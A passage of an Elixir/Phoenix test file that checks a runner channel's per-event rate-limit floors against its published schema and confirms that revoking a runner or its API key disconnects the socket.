      assert is_integer(:sys.get_state(channel.channel_pid).assigns.last_trace_at)

      pin_interval(channel, :last_trace_at)
      ref = push(channel, "trace", batch(dispatch, run_id, [1]))
      assert_reply ref, :error, %{reason: "rate_limited", min_interval_ms: _}, @reply_timeout

      # trace_cursor has its own floor, so a held-back trace does not hold it back.
      ref = push(channel, "trace_cursor", %{"run_id" => run_id})
      assert_reply ref, :ok, %{acked_seq: 0}, @reply_timeout

      pin_interval(channel, :last_cursor_at)
      ref = push(channel, "trace_cursor", %{"run_id" => run_id})
      assert_reply ref, :error, %{reason: "rate_limited"}, @reply_timeout
      assert DispatchLedger.trace_cursor(runner.tenant_id, runner.id, run_id) == 0
    end
  end

  describe "the published rate floors" do
    setup do
      {raw, runner} = fixture(:committed_runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")
      dispatch = build(:runner_dispatch)
      :ok = Runners.dispatch(runner.tenant_id, runner.id, dispatch)
      assert_push "dispatch", _, @reply_timeout
      %{channel: channel, dispatch: dispatch}
    end

    # The message each event is exercised with, and the assign its floor is timed from.
    defp floor_cases(dispatch) do
      run_id = Ecto.UUID.generate()

      [
        {"status", :last_status_at, %{"in_flight" => 1}},
        {"dispatch_reply", :last_reply_at,
         %{
           "dispatch_id" => dispatch["dispatch_id"],
           "claim_epoch" => dispatch["claim_epoch"],
           "decision" => "accepted"
         }},
        {"trace", :last_trace_at,
         build(:runner_trace_batch, %{
           :seqs => [],
           "run_id" => run_id,
           "dispatch_id" => dispatch["dispatch_id"],
           "claim_epoch" => dispatch["claim_epoch"]
         })},
        {"trace_cursor", :last_cursor_at, %{"run_id" => run_id}}
      ]
    end

    test "the export publishes every inbound event's floor, and the channel refuses with that value",
         %{channel: channel, dispatch: dispatch} do
      published = RunnerContract.json_schema()["x-connection"]["limits"]["min_interval_ms"]
      events = for {event, _, _} <- floor_cases(dispatch), do: event
      assert Enum.sort(Map.keys(published)) == Enum.sort(events)

      for {event, assign, payload} <- floor_cases(dispatch) do
        assert published[event] == RunnerContract.min_interval_ms(event)

        pin_interval(channel, assign)
        ref = push(channel, event, payload)

        assert_reply ref,
                     :error,
                     %{reason: "rate_limited", min_interval_ms: refused_with},
                     @reply_timeout

        assert refused_with == published[event], "#{event} refuses with a different floor"
      end
    end

    test "a message just past its published floor is accepted",
         %{channel: channel, dispatch: dispatch} do
      published = RunnerContract.json_schema()["x-connection"]["limits"]["min_interval_ms"]
      ref = push(channel, "dispatch_reply", Enum.at(floor_cases(dispatch), 1) |> elem(2))
      assert_reply ref, :ok, _, @reply_timeout

      for {event, assign, payload} <- floor_cases(dispatch) do
        # Timed exactly one millisecond past the published floor: an enforced floor longer
        # than the published one refuses it.
        :sys.replace_state(channel.channel_pid, fn socket ->
          at = System.monotonic_time(:millisecond) - published[event] - 1
          %{socket | assigns: Map.put(socket.assigns, assign, at)}
        end)

        ref = push(channel, event, payload)
        assert_reply ref, status, reply, @reply_timeout
        refute match?(%{reason: "rate_limited"}, reply), "#{event} (#{status}) was rate limited"
      end
    end
  end

  describe "revocation of a connected runner" do
    setup do
      {raw, runner} = fixture(:runner, %{name: "minis"})
      {:ok, socket} = connect_runner(raw)
      {_reply, channel} = join_pool(socket, "minis")
      Process.unlink(channel.channel_pid)
      @endpoint.subscribe(RunnerSocket.socket_id(runner.id))
      %{runner: runner, channel: channel}
    end

    test "revoke_runner disconnects the socket and empties the pool", %{runner: runner} do
      {:ok, _} = Runners.revoke_runner(runner.tenant_id, runner.id)

      assert_receive %Phoenix.Socket.Broadcast{event: "disconnect"}
      assert eventually(fn -> not in_pool?(runner.tenant_id, "minis") end)
    end

    test "the periodic recheck catches a key revoked through the api_keys route",
         %{runner: runner, channel: channel} do
      {:ok, key} = Auth.get_api_key(runner.tenant_id, runner.api_key_id)
      {:ok, _} = Auth.revoke_api_key(key)

      send(channel.channel_pid, :recheck)

      assert_receive %Phoenix.Socket.Broadcast{event: "disconnect"}
      assert eventually(fn -> not in_pool?(runner.tenant_id, "minis") end)
    end

    test "the periodic recheck leaves an authorized runner connected",
         %{runner: runner, channel: channel} do
      send(channel.channel_pid, :recheck)
      _ = :sys.get_state(channel.channel_pid)

      refute_received %Phoenix.Socket.Broadcast{event: "disconnect"}
      assert in_pool?(runner.tenant_id, "minis")
    end
  end
end
